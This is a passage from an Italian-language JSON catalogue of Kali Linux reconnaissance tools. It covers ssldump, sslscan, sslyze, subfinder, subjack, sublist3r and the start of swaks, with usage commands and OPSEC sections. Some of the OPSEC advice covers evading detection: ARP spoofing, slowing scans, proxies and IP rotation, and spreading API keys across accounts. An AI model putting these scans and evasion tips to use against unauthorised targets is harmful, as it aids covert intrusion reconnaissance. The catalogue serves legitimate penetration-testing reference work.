443</code></pre><p>La flag -d abilita la decifrazione del traffico applicativo (richiede -k con la chiave privata). La flag -A mostra l'application data in formato ASCII. La flag -H limita l'output ai soli messaggi di handshake. E importante notare che la decifrazione funziona solo con scambio chiavi RSA statico; con Perfect Forward Secrecy (ECDHE/DHE), la chiave privata del server non e sufficiente per decifrare il traffico poiche vengono generate chiavi di sessione effimere.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>debugging TLS e troubleshooting</strong>, ssldump viene utilizzato per diagnosticare problemi di connessione SSL/TLS come cipher mismatch, certificati scaduti, catene di certificazione incomplete e fallimenti di handshake, mostrando esattamente dove nel protocollo la comunicazione si interrompe. In contesti di <strong>security audit</strong>, lo strumento permette di verificare in tempo reale quali cipher suite vengono effettivamente negoziate tra client e server, assicurando che protocolli obsoleti come SSLv3 o TLS 1.0 non vengano utilizzati e che le cipher suite deboli siano effettivamente disabilitate. Per <strong>analisi forense</strong>, ssldump ricostruisce sessioni TLS complete da catture di rete, e quando la chiave privata e disponibile, decifra il contenuto delle comunicazioni per ricostruire l'attivita dell'utente o dell'attaccante.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'utilizzo di ssldump in modalita di cattura live richiede l'interfaccia di rete in modalita promiscua, che puo essere rilevata da sistemi di monitoraggio di rete. In ambienti switched, la cattura e limitata al traffico destinato alla propria interfaccia a meno che non si utilizzi port mirroring o ARP spoofing. Lo strumento stesso non genera traffico di rete, ma la sua presenza su un sistema puo essere rilevata da soluzioni EDR.</p><p><strong>Impatto operativo:</strong> ssldump e uno strumento passivo di analisi che non modifica ne interrompe il traffico di rete. L'impatto sulle prestazioni del sistema e minimo durante la cattura live, sebbene l'analisi di file pcap molto grandi possa richiedere risorse significative. La decifrazione del traffico e possibile solo in scenari specifici dove la chiave privata e disponibile e PFS non e utilizzato.</p><p><strong>Mitigazioni:</strong> In ambienti di produzione, utilizzare port mirroring configurato dall'amministratore di rete piuttosto che tecniche di intercettazione attive. Assicurarsi di avere autorizzazione scritta per l'intercettazione del traffico, poiche la cattura di comunicazioni cifrate puo avere implicazioni legali significative anche in contesti autorizzati. Conservare i file di cattura in modo sicuro poiche possono contenere dati sensibili decifrati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "sslscan",
    "name": "sslscan",
    "version": "2.1.5",
    "icon": "../app/icons/sslscan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sslscan/",
    "desc": "Testa configurazione SSL/TLS: cipher, protocolli, certificati e vulnerabilità note.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>sslscan</strong> e uno scanner di sicurezza progettato per analizzare in modo completo la configurazione SSL/TLS di server remoti. Lo strumento enumera sistematicamente tutte le cipher suite supportate dal server, le versioni del protocollo TLS accettate, i dettagli del certificato digitale e identifica configurazioni insicure o vulnerabilita note come Heartbleed, POODLE e CRIME. sslscan utilizza la libreria OpenSSL per tentare connessioni con ogni possibile combinazione di protocollo e cipher suite, determinando quali sono accettate dal server e classificandole in base alla robustezza crittografica. L'output utilizza un sistema di colori che evidenzia immediatamente le configurazioni problematiche: rosso per cipher suite deboli o protocolli obsoleti, giallo per configurazioni subottimali e verde per quelle conformi alle best practice. Lo strumento e diventato uno standard de facto per la valutazione rapida della sicurezza TLS durante penetration test e security audit.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Enumerazione Cipher Suite Completa:</strong> sslscan testa sistematicamente tutte le cipher suite disponibili nella libreria OpenSSL contro il server target, identificando quelle accettate e quelle rifiutate. Per ogni cipher accettata mostra l'algoritmo di scambio chiavi (RSA, ECDHE, DHE), il cifrario simmetrico (AES-128, AES-256, 3DES, RC4), la modalita (CBC, GCM) e la funzione hash (SHA, SHA256, SHA384). Questo livello di dettaglio permette una valutazione precisa della robustezza crittografica.</p><p><strong>Rilevamento Vulnerabilita Specifiche:</strong> Lo strumento include test dedicati per vulnerabilita TLS note tra cui Heartbleed (CVE-2014-0160), POODLE (CVE-2014-3566), CRIME (compressione TLS), e cipher suite RC4. Ogni test viene eseguito in modo sicuro senza sfruttare effettivamente la vulnerabilita, limitandosi a verificare se il server e suscettibile. I risultati sono presentati in modo chiaro con indicazione del livello di rischio associato a ciascuna vulnerabilita trovata.</p><p><strong>Analisi Certificato e Catena di Fiducia:</strong> sslscan estrae e visualizza le informazioni complete del certificato del server inclusi Common Name, Subject Alternative Names, periodo di validita, algoritmo di firma, dimensione della chiave e dettagli dell'emittente. Verifica inoltre la catena di certificazione e identifica problemi come certificati self-signed, catene incomplete, algoritmi di firma deboli (SHA-1) e chiavi di dimensione insufficiente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>sslscan e uno strumento a riga di comando che accetta come parametro principale l'hostname o l'indirizzo IP del server target. Per default scansiona la porta 443, ma supporta porte personalizzate e connessioni STARTTLS per protocolli come SMTP, IMAP e FTP.</p><pre><code># Scansione base di un server HTTPS\nsslscan target.com\n\n# Scansione su porta personalizzata\nsslscan target.com:8443\n\n# Esportare risultati in formato XML\nsslscan --xml=report.xml target.com\n\n# Test STARTTLS su server SMTP\nsslscan --starttls-smtp mail.target.com:25\n\n# Test STARTTLS su server IMAP\nsslscan --starttls-imap mail.target.com:143\n\n# Mostrare solo cipher suite supportate\nsslscan --no-fallback --no-renegotiation --no-heartbleed target.com</code></pre><p>L'output colorato di sslscan e immediatamente interpretabile: le cipher suite in verde sono considerate sicure, quelle in giallo meritano attenzione e quelle in rosso rappresentano rischi di sicurezza che richiedono remediation. Per report formali, l'export XML permette l'integrazione con piattaforme di vulnerability management e la generazione di documentazione strutturata.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>security audit e penetration test</strong>, sslscan e tipicamente il primo strumento eseguito contro servizi HTTPS per valutare rapidamente la postura di sicurezza della configurazione TLS, identificando protocolli obsoleti, cipher deboli e vulnerabilita note che richiedono remediation. Per verifiche di <strong>compliance normativa</strong>, lo strumento viene utilizzato per documentare la conformita ai requisiti PCI-DSS, HIPAA e altre normative che specificano versioni TLS minime e cipher suite accettabili, producendo evidenze XML per i report di audit. In contesti di <strong>monitoraggio continuo della sicurezza</strong>, sslscan viene integrato in script automatizzati che verificano periodicamente la configurazione TLS di tutti i server esposti, generando alert quando vengono rilevate regressioni o nuove vulnerabilita dopo aggiornamenti o modifiche di configurazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> sslscan genera numerose connessioni TLS in rapida successione con diverse combinazioni di cipher suite e versioni di protocollo, un pattern facilmente distinguibile dal traffico normale. I sistemi IDS/IPS e i WAF possono identificare questa attivita di enumerazione e bloccare l'IP sorgente. I log del server registrano i tentativi di handshake multipli, inclusi quelli con protocolli obsoleti come SSLv2/v3 che normalmente non vengono piu utilizzati dai client legittimi.</p><p><strong>Impatto operativo:</strong> Le scansioni sslscan sono generalmente non distruttive e non impattano la disponibilita del servizio target. Tuttavia, in rari casi, server con implementazioni TLS fragili possono subire crash o degradazione prestazionale quando sottoposti a tentativi di connessione con cipher suite inaspettate. Il test Heartbleed invia payload specifici che potrebbero essere interpretati come attacco da soluzioni di sicurezza.</p><p><strong>Mitigazioni:</strong> Eseguire le scansioni da IP autorizzati e comunicare preventivamente al team di sicurezza del target per evitare falsi allarmi. Se la discrezione e importante, limitare i test ai soli protocolli e cipher di interesse piuttosto che eseguire una scansione completa. Distribuire le connessioni nel tempo per ridurre la visibilita del pattern di enumerazione. Utilizzare l'output XML per documentare i risultati senza necessita di ripetere le scansioni.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "sslyze",
    "name": "sslyze",
    "version": "6.2.0",
    "icon": "../app/icons/sslyze-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sslyze/",
    "desc": "Scanner SSL/TLS veloce e completo con output JSON per automazione security audit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SSLyze</strong> e uno scanner SSL/TLS ad alte prestazioni sviluppato in Python, progettato specificamente per l'automazione e l'integrazione in pipeline di sicurezza. Lo strumento si distingue per la capacita di produrre output JSON strutturato ideale per l'elaborazione programmatica, il supporto per scansioni parallele multi-thread che permettono di analizzare rapidamente centinaia di endpoint, e la verifica di conformita a standard riconosciuti come le linee guida Mozilla TLS e i requisiti PCI-DSS. SSLyze implementa i propri test TLS senza dipendere dalla libreria OpenSSL del sistema, garantendo risultati consistenti indipendentemente dalla piattaforma di esecuzione. Lo strumento supporta la validazione completa della catena certificati includendo verifiche OCSP stapling, Certificate Transparency logs e HPKP, offrendo una visione olistica della sicurezza TLS che va oltre la semplice enumerazione delle cipher suite. La sua architettura modulare permette di selezionare specifici test da eseguire, ottimizzando il tempo di scansione quando sono necessarie solo verifiche mirate.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Output JSON Strutturato per Automazione:</strong> SSLyze produce risultati in formato JSON dettagliato che include ogni aspetto della configurazione TLS analizzata, dalla lista delle cipher suite ai dettagli dei certificati fino ai risultati dei test di vulnerabilita. Questo formato permette l'integrazione diretta in sistemi di continuous monitoring, pipeline CI/CD e piattaforme di vulnerability management, abilitando la verifica automatica della conformita TLS ad ogni deployment. Lo schema JSON e stabile e documentato, facilitando lo sviluppo di parser personalizzati.</p><p><strong>Verifica Conformita a Standard di Sicurezza:</strong> Lo strumento include moduli dedicati per verificare la conformita della configurazione TLS a standard specifici come le raccomandazioni Mozilla (modern, intermediate, old), i requisiti PCI-DSS per il trattamento dei dati delle carte di credito e altre linee guida settoriali. Ogni profilo di conformita definisce versioni TLS minime, cipher suite accettabili e parametri del certificato richiesti, e SSLyze confronta automaticamente la configurazione del server con questi requisiti producendo un report di conformita dettagliato.</p><p><strong>Test Vulnerabilita Avanzati:</strong> Oltre ai test standard come Heartbleed e POODLE, SSLyze include verifiche per vulnerabilita specifiche come ROBOT (Return Of Bleichenbacher's Oracle Threat), OpenSSL CCS injection, TLS downgrade prevention (SCSV) e session renegotiation insicura. Ogni test e implementato con cura per minimizzare i falsi positivi, fornendo risultati affidabili che non richiedono verifica manuale nella maggior parte dei casi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SSLyze puo essere utilizzato sia come strumento da riga di comando che come libreria Python importabile in script personalizzati. L'installazione avviene tramite pip e non richiede configurazione aggiuntiva.</p><pre><code># Scansione completa di un singolo server\nsslyze target.com\n\n# Output JSON per automazione\nsslyze --json_out=results.json target.com\n\n# Scansione di multipli server da file\nsslyze --targets_in=servers.txt --json_out=bulk_results.json\n\n# Test specifici per vulnerabilita note\nsslyze --heartbleed --robot --openssl_ccs target.com\n\n# Verifica conformita Mozilla (profilo modern)\nsslyze --mozilla_config=modern target.com\n\n# Scansione con certificate info dettagliate\nsslyze --certinfo target.com\n\n# STARTTLS per servizi non-HTTPS\nsslyze --starttls smtp mail.target.com:25</code></pre><p>Per l'integrazione in pipeline CI/CD, SSLyze puo essere importato come modulo Python, permettendo di scrivere test personalizzati che verificano automaticamente la configurazione TLS dei servizi dopo ogni deployment. L'exit code del comando riflette il successo o il fallimento della scansione, facilitando l'integrazione con sistemi di build automation. Per scansioni di grandi volumi, l'opzione --targets_in permette di elaborare liste di server con parallelismo configurabile.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>integrazione CI/CD e DevSecOps</strong>, SSLyze viene incorporato nelle pipeline di deployment per verificare automaticamente che la configurazione TLS dei servizi soddisfi i requisiti di sicurezza aziendali prima di ogni rilascio in produzione, bloccando deployment che introdurrebbero regressioni nella sicurezza TLS. In contesti di <strong>compliance audit su larga scala</strong>, lo strumento permette di scansionare centinaia di endpoint in parallelo producendo report JSON aggregabili, documentando la conformita PCI-DSS o ad altri standard per interi portafogli applicativi con un singolo comando. Per <strong>monitoraggio continuo dell'infrastruttura</strong>, SSLyze viene schedulato per eseguire scansioni periodiche di tutti i servizi TLS esposti, generando alert automatici quando vengono rilevate configurazioni non conformi, certificati in scadenza o nuove vulnerabilita.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Come altri scanner TLS, SSLyze genera multiple connessioni con diverse configurazioni di cipher suite e protocolli che producono un pattern di traffico riconoscibile come attivita di security scanning. I log del server mostreranno numerosi handshake TLS in rapida successione, inclusi tentativi con protocolli e cipher obsoleti. Le soluzioni di rate limiting e WAF possono bloccare l'IP sorgente dopo un numero elevato di connessioni in breve tempo.</p><p><strong>Impatto operativo:</strong> Le scansioni SSLyze sono generalmente non invasive e non compromettono la disponibilita dei servizi target. Tuttavia, la parallelizzazione aggressiva di scansioni su molti server puo generare volumi di traffico significativi. I test per vulnerabilita specifiche come ROBOT inviano payload costruiti appositamente che, sebbene non sfruttino la vulnerabilita, potrebbero essere classificati come attacchi da soluzioni IDS/IPS con signature matching.</p><p><strong>Mitigazioni:</strong> Per scansioni autorizzate, comunicare preventivamente con il team di sicurezza del target per evitare falsi allarmi e potenziali blocchi IP. Configurare il livello di parallelismo in base alla capacita del target per evitare sovraccarico. Utilizzare l'opzione --targets_in con liste mirate piuttosto che range di IP per limitare lo scope. In contesti dove la discrezione e importante, selezionare solo i test strettamente necessari piuttosto che eseguire la scansione completa.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "subfinder",
    "name": "subfinder",
    "version": "2.6.0",
    "icon": "../app/icons/subfinder-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/subfinder/",
    "desc": "Enumera subdomain passivamente usando decine di fonti: Shodan, Censys, VirusTotal.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Subfinder</strong> e uno strumento di subdomain enumeration passiva sviluppato dal team ProjectDiscovery, progettato per scoprire subdomain associati a un dominio target interrogando esclusivamente fonti di dati esterne senza generare alcun traffico diretto verso l'infrastruttura target. Lo strumento integra oltre 50 fonti di dati tra cui Shodan, Censys, VirusTotal, SecurityTrails, Chaos, BufferOver, DNSdumpster e molte altre, aggregando e deduplicando i risultati per produrre una lista completa dei subdomain noti. Subfinder e scritto in Go per garantire prestazioni elevate e supporta la configurazione di API key per accedere a fonti premium che offrono dati piu completi e aggiornati. Lo strumento e diventato uno standard nella fase di reconnaissance passiva per penetration testing e bug bounty, spesso utilizzato in combinazione con altri tool ProjectDiscovery come httpx per la validazione e nuclei per il vulnerability scanning. La natura completamente passiva dell'enumerazione lo rende sicuro da utilizzare anche in fasi preliminari di assessment dove il contatto diretto con il target non e ancora autorizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Integrazione Multi-Source Massiva:</strong> Subfinder interroga simultaneamente oltre 50 fonti di dati diversificate che includono motori di ricerca specializzati (Shodan, Censys, Fofa), servizi di threat intelligence (VirusTotal, AlienVault OTX), database di certificati (crt.sh, Certspotter), archivi DNS passivi (SecurityTrails, DNSdumpster) e API di discovery (Chaos, BufferOver). Ogni fonte viene interrogata in parallelo e i risultati vengono aggregati e deduplicati automaticamente, garantendo la massima copertura possibile senza ridondanze nell'output.</p><p><strong>Configurazione API Key e Fonti Premium:</strong> Lo strumento supporta la configurazione di API key per fonti che richiedono autenticazione o che offrono risultati piu completi con accesso premium. Il file di configurazione provider-config.yaml permette di specificare chiavi per ogni fonte individualmente, e Subfinder gestisce automaticamente rate limiting e retry per rispettare i limiti delle API. Le fonti gratuite forniscono gia risultati significativi, ma le chiavi premium possono aumentare la copertura del 30-50% per domini di grandi dimensioni.</p><p><strong>Output Flessibile e Integrazione Pipeline:</strong> Subfinder produce output in multipli formati tra cui testo semplice (un subdomain per riga), JSON con metadati delle fonti e output diretto su stdout per pipeline con altri strumenti. Supporta l'elaborazione di liste di domini multipli e puo essere facilmente integrato in workflow automatizzati con tool come httpx (per verificare quali subdomain sono attivi), naabu (per port scanning) e nuclei (per vulnerability scanning), formando una catena di reconnaissance completa.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Subfinder e distribuito come singolo binario Go senza dipendenze esterne. La configurazione delle API key e opzionale ma raccomandata per massimizzare i risultati. Il file di configurazione si trova tipicamente in $HOME/.config/subfinder/provider-config.yaml.</p><pre><code># Enumerazione base di un dominio\nsubfinder -d target.com\n\n# Salvare risultati su file\nsubfinder -d target.com -o subdomains.txt\n\n# Enumerazione di multipli domini da file\nsubfinder -dL domains.txt -o all_subdomains.txt\n\n# Output JSON con informazioni sulle fonti\nsubfinder -d target.com -json -o results.json\n\n# Utilizzare solo fonti specifiche\nsubfinder -d target.com -sources shodan,censys,virustotal\n\n# Escludere fonti specifiche\nsubfinder -d target.com -exclude-sources bing,yahoo\n\n# Pipeline con httpx per verificare subdomain attivi\nsubfinder -d target.com -silent | httpx -silent -status-code</code></pre><p>Per ottenere risultati ottimali, configurare almeno le API key per le fonti principali: SecurityTrails, Shodan, Censys, VirusTotal e Chaos. La flag -silent sopprime il banner e le informazioni di progresso, producendo solo la lista di subdomain per facilitare l'uso in pipeline. L'opzione -recursive abilita l'enumerazione ricorsiva dei sotto-subdomain trovati, aumentando significativamente la copertura ma anche il tempo di esecuzione. Per domini molto grandi con migliaia di subdomain, l'output JSON permette analisi successive piu strutturate.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In attivita di <strong>bug bounty</strong>, Subfinder e tipicamente il primo strumento eseguito per mappare l'attack surface di un programma, scoprendo subdomain che potrebbero ospitare applicazioni vulnerabili, ambienti di staging dimenticati o servizi legacy non piu mantenuti ma ancora accessibili pubblicamente. Per <strong>attack surface management</strong> aziendale, lo strumento viene schedulato per eseguire enumerazioni periodiche dell'intero portafoglio domini dell'organizzazione, identificando nuovi subdomain che compaiono (potenziale shadow IT) o subdomain che puntano a risorse non piu controllate (subdomain takeover). Durante la <strong>fase di reconnaissance passiva</strong> di un penetration test, Subfinder permette di raccogliere informazioni dettagliate sull'infrastruttura del target senza generare alcun traffico verso i suoi sistemi, mantenendo la piena discrezione operativa nella fase iniziale dell'assessment.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Subfinder non genera traffico diretto verso il dominio target, rendendolo virtualmente non rilevabile dall'organizzazione target. Tuttavia, le query vengono inviate ai provider di dati (Shodan, Censys, VirusTotal, etc.) che potrebbero loggare le ricerche. Alcuni provider premium come SecurityTrails notificano i proprietari dei domini quando vengono effettuate ricerche sui loro asset, potenzialmente alertando il target indirettamente.</p><p><strong>Impatto operativo:</strong> Essendo uno strumento completamente passivo, Subfinder non ha alcun impatto sull'infrastruttura target. L'unica limitazione operativa e legata ai rate limit delle API dei provider, che possono rallentare le enumerazioni su domini molto grandi o quando si eseguono scansioni in rapida successione. I risultati potrebbero non essere completamente aggiornati poiche dipendono dalla frequenza con cui le fonti indicizzano i dati DNS.</p><p><strong>Mitigazioni:</strong> Per massimizzare la discrezione, evitare l'uso di fonti che notificano i proprietari dei domini e diversificare le API key tra diversi account. Utilizzare proxy o VPN per le query API se si vuole dissociare le ricerche dalla propria identita. Validare sempre i risultati con DNS resolution attiva (httpx, dnsx) prima di agire su di essi, poiche le fonti passive possono contenere subdomain storici non piu esistenti. Combinare con amass in modalita passiva per cross-validazione e copertura massima.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "subjack",
    "name": "subjack",
    "version": "2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/subjack/",
    "desc": "Rileva subdomain takeover su servizi cloud: S3, Heroku, GitHub Pages, Azure.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Subjack</strong> e uno scanner specializzato nella rilevazione di subdomain takeover, una classe di vulnerabilita in cui record DNS CNAME puntano a servizi cloud non piu reclamati. Lo strumento, scritto in Go, verifica sistematicamente una lista di subdomain controllando se i CNAME associati risolvono verso provider come AWS S3, Heroku, GitHub Pages, Azure, Shopify, Fastly e oltre 30 altri servizi. Quando un CNAME punta a una risorsa cloud non piu esistente, un attaccante puo registrare quella risorsa e prendere controllo del subdomain, servendo contenuto arbitrario sotto il dominio della vittima. Subjack automatizza questo processo di verifica con scansioni parallele ad alte prestazioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Multi-Provider Detection:</strong> Subjack mantiene un database di fingerprint per oltre 30 servizi cloud differenti. Per ciascun provider, lo strumento conosce le risposte HTTP caratteristiche che indicano una risorsa non reclamata (ad esempio, pagine di errore specifiche di S3, Heroku o GitHub Pages). Questo permette di distinguere tra un servizio attivo e uno vulnerabile a takeover con alta precisione.</p><p><strong>Scansione Parallela ad Alta Velocita:</strong> Grazie all'implementazione in Go con goroutine, Subjack puo verificare migliaia di subdomain simultaneamente. Il numero di thread e configurabile, permettendo di bilanciare velocita e carico sulla rete. Questo rende lo strumento adatto a scope di bug bounty con decine di migliaia di subdomain.</p><p><strong>Verifica SSL e HTTPS:</strong> Lo strumento supporta la verifica tramite connessioni HTTPS, fondamentale per identificare takeover su servizi che richiedono certificati SSL. L'opzione -ssl attiva il controllo su porta 443, permettendo di rilevare vulnerabilita anche su endpoint protetti da TLS che altrimenti restituirebbero errori di certificato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Subjack richiede in input una lista di subdomain precedentemente enumerati. Si integra perfettamente nella pipeline con strumenti come subfinder, amass o sublist3r per la fase di discovery.</p><pre><code># Scansione base di una lista di subdomain\nsubjack -w subdomains.txt -t 100 -timeout 30\n\n# Scansione con verifica SSL per servizi HTTPS\nsubjack -w subdomains.txt -ssl -t 100\n\n# Salvataggio risultati vulnerabili su file\nsubjack -w subdomains.txt -t 100 -o takeover_results.txt\n\n# Con file di fingerprint personalizzato\nsubjack -w subdomains.txt -c fingerprints.json -t 200\n\n# Pipeline completa: enumeration + takeover check\nsubfinder -d target.com -o subs.txt &amp;&amp; subjack -w subs.txt -ssl -o results.txt</code></pre><p>I risultati mostrano chiaramente quali subdomain sono vulnerabili, il provider coinvolto e il CNAME pendente. E fondamentale verificare manualmente ogni risultato prima di procedere con il claiming.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel contesto di <strong>bug bounty</strong>, il subdomain takeover e una delle vulnerabilita piu ricercate e remunerate. Subjack permette di automatizzare la verifica su migliaia di asset in pochi minuti, identificando CNAME pendenti che possono essere reclamati per dimostrare il rischio. Molti programmi accettano la sola evidenza del CNAME pendente senza richiedere il claiming effettivo. In scenari di <strong>security audit aziendale</strong>, Subjack e essenziale per verificare che tutti i record DNS puntino a risorse attive, specialmente dopo migrazioni cloud o dismissione di servizi. Un subdomain takeover riuscito permette phishing credibile, furto di cookie tramite same-origin policy e distribuzione di malware sotto un dominio trusted.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La scansione genera un volume significativo di query DNS e richieste HTTP verso i provider cloud. Sebbene il traffico sia diretto ai provider e non al target stesso, i DNS resolver utilizzati possono loggare le query. I provider cloud possono rilevare pattern di verifica massiva.</p><p><strong>Impatto operativo:</strong> Lo strumento e di natura passiva e non modifica alcuna risorsa. Tuttavia, il claiming effettivo di un subdomain vulnerabile richiede autorizzazione esplicita, poiche comporta la registrazione di risorse cloud e la potenziale intercettazione di traffico destinato al dominio. In ambito bug bounty, molti programmi richiedono di segnalare senza procedere al takeover.</p><p><strong>Mitigazioni:</strong> Utilizzare DNS resolver privati per ridurre la visibilita delle query. Limitare il rate di scansione con il parametro -t per evitare di saturare le risorse. Verificare sempre manualmente i risultati per escludere falsi positivi prima di includerli nei report.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "sublist3r",
    "name": "sublist3r",
    "version": "1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sublist3r/",
    "desc": "Enumera subdomain usando motori di ricerca e servizi come Netcraft, DNSdumpster.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Sublist3r</strong> e uno strumento Python per la scoperta di subdomain che combina l'interrogazione di motori di ricerca con servizi di intelligence DNS. Lo strumento effettua query su Google, Bing, Yahoo, Baidu, Ask, Netcraft, DNSdumpster, VirusTotal e ThreatCrowd per raccogliere subdomain in modo passivo. Opzionalmente integra subbrute per brute force attivo con wordlist. La capacita di aggregare risultati da fonti multiple lo rende efficace per ottenere una visione completa della superficie di attacco di un dominio, anche quando singole fonti restituiscono risultati parziali.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Multi-Engine Search:</strong> Sublist3r interroga simultaneamente numerosi motori di ricerca utilizzando dork specifici per estrarre subdomain indicizzati. Ogni motore viene interrogato con paginazione automatica per massimizzare la copertura. Il risultato aggregato da fonti multiple garantisce una discovery piu completa rispetto all'uso di un singolo motore.</p><p><strong>Brute Force Integrato:</strong> Tramite l'integrazione con subbrute, Sublist3r puo eseguire brute force DNS utilizzando wordlist personalizzabili. Questa modalita attiva complementa la discovery passiva, trovando subdomain non indicizzati dai motori di ricerca. Il numero di thread e configurabile per bilanciare velocita e affidabilita delle risoluzioni DNS.</p><p><strong>Port Scanning Opzionale:</strong> Sublist3r include la capacita di eseguire port scan sui subdomain scoperti, verificando la raggiungibilita di porte comuni come 80, 443, 8080 e 8443. Questo permette di identificare immediatamente quali subdomain ospitano servizi web attivi, prioritizzando i target per fasi successive di assessment.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Sublist3r e tipicamente il primo strumento utilizzato nella fase di reconnaissance per mappare i subdomain di un target. I risultati alimentano poi tool come subjack, httpx o nuclei.</p><pre><code># Enumerazione base di subdomain\nsublist3r -d target.com\n\n# Salvataggio risultati su file\nsublist3r -d target.com -o subdomain_list.txt\n\n# Con brute force attivo e 50 thread\nsublist3r -d target.com -b -t 50\n\n# Con port scanning su porte web comuni\nsublist3r -d target.com -p 80,443,8080,8443\n\n# Usando solo motori specifici\nsublist3r -d target.com -e google,virustotal,netcraft</code></pre><p>I risultati vengono stampati a schermo e salvati su file, pronti per essere utilizzati come input per strumenti successivi nella catena di reconnaissance.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>bug bounty</strong>, Sublist3r e lo strumento iniziale per determinare lo scope di un programma, scoprendo subdomain che ospitano applicazioni web vulnerabili. La modalita passiva permette di raccogliere informazioni senza generare traffico verso il target. In combinazione con brute force, garantisce una copertura completa anche per subdomain non indicizzati. Per <strong>penetration testing</strong>, la discovery di subdomain rivela punti di ingresso aggiuntivi come pannelli di amministrazione, API interne, ambienti di staging e servizi legacy che spesso hanno configurazioni di sicurezza piu deboli rispetto al sito principale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La modalita passiva non genera traffico verso il target ma le query ai motori di ricerca possono essere tracciate. Query eccessive possono triggare CAPTCHA su Google e altri motori, riducendo l'efficacia dello strumento. La modalita brute force genera traffico DNS significativo verso i resolver autoritativi del dominio target.</p><p><strong>Impatto operativo:</strong> I motori di ricerca implementano rate limiting che puo rallentare la scansione. Le API di servizi come VirusTotal richiedono chiavi per accesso completo. I risultati delle fonti passive possono includere subdomain storici non piu attivi, richiedendo validazione successiva.</p><p><strong>Mitigazioni:</strong> Utilizzare proxy e rotazione IP per evitare blocchi dai motori di ricerca. Configurare API key per le fonti che le supportano. Limitare la modalita brute force a scope autorizzati. Validare i risultati con risoluzione DNS prima di procedere con assessment attivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "swaks",
    "name": "swaks",
    "version": "20240103.0",
    "icon": "../app/icons/swaks-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/swaks/",
    "desc": "Swiss Army Knife SMTP: test mail server, relay, auth, TLS con massima flessibilità.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Swaks</strong> (Swiss Army Knife for SMTP) e lo strumento di riferimento per il testing completo di server SMTP. Permette di interagire con qualsiasi server di posta a basso livello, testando ogni aspetto del protocollo SMTP inclusi relay aperti, meccanismi di autenticazione, STARTTLS, header personalizzati e invio di allegati. Lo strumento e particolarmente prezioso per verificare configurazioni di sicurezza dei mail server, testare filtri anti-spam e anti-phishing, e simulare attacchi di social engineering via email. La sua flessibilita lo rende indispensabile in ogni penetration test che coinvolga infrastruttura email.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Test Completo Protocollo SMTP:</strong> Swaks permette di controllare ogni fase della conversazione SMTP, dal HELO/EHLO iniziale fino alla consegna del messaggio. Supporta tutti i comandi SMTP standard e le estensioni come PIPELINING, SIZE, 8BITMIME e DSN. Questo livello di controllo permette di identificare configurazioni errate e comportamenti anomali del server.</p><p><strong>Autenticazione Multi-Metodo:</strong> Lo strumento supporta tutti i principali meccanismi di autenticazione SMTP: PLAIN, LOGIN, CRAM-MD5, DIGEST-MD5, NTLM e XOAUTH2. Permette di testare la robustezza delle configurazioni di autenticazione e verificare se il server accetta metodi insicuri come PLAIN senza TLS.</p><p><strong>Crafting Completo di Email:</strong> Swaks permette la personalizzazione totale 